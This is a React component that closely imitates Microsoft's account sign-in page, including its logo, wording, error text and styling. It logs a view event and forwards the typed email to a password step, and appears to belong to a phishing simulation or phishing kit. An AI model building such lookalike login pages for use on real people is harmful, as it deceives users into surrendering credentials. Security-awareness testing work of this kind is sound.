import { useNavigate } from 'react-router';
import { useState, useEffect } from 'react';
import { trackEvent } from '../api';
import { MsPage, SsoCard, SsoButton } from './SsoLayout';
import msLogo from '../../assets/ms-logo.svg';

export function SignIn() {
  const navigate = useNavigate();
  const [email, setEmail] = useState('');
  const [error, setError] = useState('');

  useEffect(() => {
    trackEvent('sign_in_view');
  }, []);

  const handleNext = () => {
    if (!email.trim() || !email.includes('@')) {
      setError('Enter a valid email address, phone number, or Skype name.');
      return;
    }
    navigate(`/password?email=${encodeURIComponent(email)}`);
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') handleNext();
  };

  return (
    <MsPage>
      <SsoCard>
        <div className="sso-page-content" style={{ padding: '44px' }}>
          {/* Microsoft Logo */}
          <img src={msLogo} alt="Microsoft" style={{ height: '24px', marginBottom: '16px' }} />

          {/* Heading */}
          <h1 style={{ fontSize: '24px', fontWeight: 600, margin: '16px 0 12px', lineHeight: '28px', color: '#1b1b1b' }}>
            Sign in
          </h1>

          {/* Error */}
          {error && (
            <div style={{ color: '#e81123', fontSize: '13px', marginBottom: '12px' }}>{error}</div>
          )}

          {/* Email Input */}
          <div style={{ marginBottom: '16px' }}>
            <input
              type="text"
              value={email}
              onChange={(e) => { setEmail(e.target.value); setError(''); }}
              onKeyDown={handleKeyDown}
              placeholder="Email, phone, or Skype"
              autoFocus
              style={{
                width: '100%',
                fontSize: '15px',
                padding: '6px 10px 6px 0',
                border: 'none',
                borderBottom: `1px solid ${error ? '#e81123' : '#666'}`,
                outline: 'none',
                color: '#1b1b1b',
                backgroundColor: 'transparent',
                boxSizing: 'border-box',
                fontFamily: 'inherit',
                height: '36px',
              }}
            />
          </div>

          {/* Links */}
          <div style={{ fontSize: '13px', marginBottom: '4px' }}>
            <span>No account? </span>
            <a href="#" style={{ color: '#0067b8' }}>Create one!</a>
          </div>
          <div style={{ fontSize: '13px', marginBottom: '20px' }}>
            <a href="#" style={{ color: '#0067b8' }}>Can't access your account?</a>
          </div>

          {/* Next Button */}
          <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
            <SsoButton onClick={handleNext}>Next</SsoButton>
          </div>
        </div>
      </SsoCard>

      {/* Sign-in options (below card, separate section) */}
      <div
        style={{
          width: '440px',
          maxWidth: '440px',
          backgroundColor: '#fff',
          boxShadow: '0 2px 6px rgba(0,0,0,0.2)',
          padding: '12px 44px',
          marginTop: '1px',
          display: 'flex',
          alignItems: 'center',
          gap: '12px',
          cursor: 'pointer',
          boxSizing: 'border-box',
        }}
      >
        <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
          <path
            d="M10 2C7.79 2 6 3.79 6 6C6 8.21 7.79 10 10 10C12.21 10 14 8.21 14 6C14 3.79 12.21 2 10 2ZM10 8.5C8.62 8.5 7.5 7.38 7.5 6C7.5 4.62 8.62 3.5 10 3.5C11.38 3.5 12.5 4.62 12.5 6C12.5 7.38 11.38 8.5 10 8.5ZM4 15V16H16V15C16 12.33 10.67 11 10 11C9.33 11 4 12.33 4 15Z"
            fill="#706D6B"
          />
        </svg>
        <span style={{ fontSize: '15px', color: '#1b1b1b' }}>Sign-in options</span>
      </div>
    </MsPage>
  );
}
